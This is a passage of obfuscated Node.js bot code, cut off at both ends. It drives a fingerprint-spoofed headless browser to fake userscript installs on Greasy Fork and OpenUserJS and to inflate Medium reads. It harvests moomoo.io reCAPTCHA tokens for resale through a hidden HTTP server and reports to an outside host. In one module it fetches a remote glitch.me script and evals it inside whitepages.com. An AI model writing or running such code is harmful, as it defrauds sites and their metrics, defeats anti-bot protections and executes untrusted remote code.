      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + X(0x13, 'Ci]P') + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + X(0xe, 'wC7u'),
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + X(0x17, 'y&nZ') + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + W(0xa) + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0xcb5 * 0x2 + -0x6e * 0x22 + -0xace
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x5 * -0x269 + -0x33d * 0x7 + 0x22b8)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const Z = b;
            let p;
            const q = {
              'User-Agent': userAgents[Z(0x11, 'YWiF')](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + a0(0x7));
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0xa86 + 0x21f4 + 0x1 * -0x170a), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x265c + -0xb3 + 0x2773 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x202e * -0x1 + -0xce7 + 0x3 * 0xf07;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x5 * -0x5dd + -0xd * 0x1bd + 0x33ea; w < getRandomInt(0x232 + 0xc * -0x7c + 0x67 * 0x9, -0x1af6 + -0x1 * 0x3da + 0x1ed5); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x4281 + -0x18534 + -0x51 * -0x885);
        }
      }();
    }, 0x12c8 + -0x9b * 0x14 + -0x648), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x313 * 0x8 + -0x1 * 0x1457 + -0x441;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x43 * -0x16 + 0x647 * -0x5 + 0x19a1, -0x9 * 0x1b5 + 0x227 * -0x2 + 0x3 * 0x69f)), !z['includes'](a1(0x16)))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        const a2 = d;
        return await (A && doFlags[a2(0xf)] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x1 * -0x656 + 0x1f * -0xbb + 0x1 * 0x922b);
    }, -0x1b17 + 0x1fcf + -0x454), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1f33 + -0xcf * -0x22 + -0x3ab1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * 0x23b1 + -0x696 * 0x1 + 0x17 * 0x259), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1 * 0x1c63 + -0x1de2 + 0x3a45), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1 * 0x13bd5b + -0x8259 + 0x26 * 0xe4ee);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * -0x1da3 + -0x664 + 0x16db * -0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1a5b + 0x1 * -0x321 + 0x1e44);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x144d + 0x6af * 0x2 + -0x1 * -0x267f);
}

function a() {
  const br = [
    'W7BdOLBcImoOWPm',
    'CMjLyxn0ihn1BG',
    'easyfork.o',
    'WOfKkLFcOd0GWPJcGSoN',
    'anti-bd-re',
    'goto',
    'WOKivmkVW6yHW6a',
    'Dw5JAgvK',
    'W4NcHZVcPLz7d8oZW4ZcTW',
    'C2v0vgLTzw91Da',
    'zgL1Bs5JB20Vqa',
    'getElement',
    'AgvHzgvYCW',
    'jd3cHmo8WPufWQqMp1u',
    'gv5TW7/dGYiEW7VcJq',
    'doDual',
    'ghWcqqhdNMtdH8oCjW',
    'WRJdSYfPW6/dIG',
    'l3P5zw5PDgGVuW',
    'sY/cR8k2WQNcPfdcR8oiW7G',
    'q29TAw5Nx1nVBW',
    'u6RVZKcN9z',
    'isMoomooIo',
    'WQFcUGPAvWvxqJ1W',
    'BtncqwHLmxDZBa',
    'W5VcJmo8W41dWO1UW48Esa',
    'applicatio',
    'BMvJCMfMDcbIDq',
    'd8kLW5zVdtlcRe19AW'
  ];
  a = function() {
    return br;
  };
  return a();
}
doFlags['doOUJS'] && ((async () => {
  const a7 = c,
    a6 = b;
  async function f() {
    const a5 = c,
      a4 = b,
      a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xc3 * -0x22 + 0x140f + -0x2df4) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1db8 + -0x18a8 + 0x3661));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x67 * 0x24 + 0x1aa0 + -0x291c, D['indexOf']('\x20'));
        return B ? E['slice'](-0x469 + 0x38 * -0x7a + 0x1f19, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1 * -0x3f9c + -0x4115 + -0x15 * -0x7fd),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + a3(0x1a) + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + a4(0x6, 'tZP%'),
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x199 * 0x5 + -0x2593 + 0x2a5 * 0x20),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y[a5(0xc)], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': a4(0x3, 'WEbB') + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + a6(0x8, '#RvL') + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + a7(0x14) + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a7(0x12) + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x7f6 * 0x1 + -0x2026 + 0x281c; k < 0x473 + -0x121c + -0x48f * -0x3; k++)
    setTimeout(f, (0x13e61 + -0x2 * 0x14e0 + -0x175 * 0x1d) * k * getRandomInt(-0x16d2 + -0xdf * 0x1d + 0x3016, 0x254c + -0x1a8e + -0x43 * 0x29));
  setInterval(() => {
    f();
